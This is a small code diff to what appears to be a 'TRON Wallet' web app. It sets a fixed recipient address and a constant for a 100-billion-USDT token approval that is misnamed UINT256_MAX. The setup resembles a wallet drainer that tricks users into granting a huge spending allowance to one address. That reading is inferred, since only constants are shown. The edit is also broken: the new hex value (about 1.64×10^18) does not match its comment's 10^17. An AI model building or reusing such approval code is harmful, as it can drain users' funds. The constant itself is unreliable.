@@ -9,8 +9,8 @@ const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const USDT_DECIMALS   = 6;
 const FEE_LIMIT       = 200_000_000;
 
-// 100 billion USDT approval (100,000,000,000 * 10^6)
-const UINT256_MAX = "100000000000000000";
+// 100 billion USDT approval (100 * 10^9 * 10^6 decimals)
+const UINT256_MAX = "0x16bcc41e90000000";
 
 const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
 const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
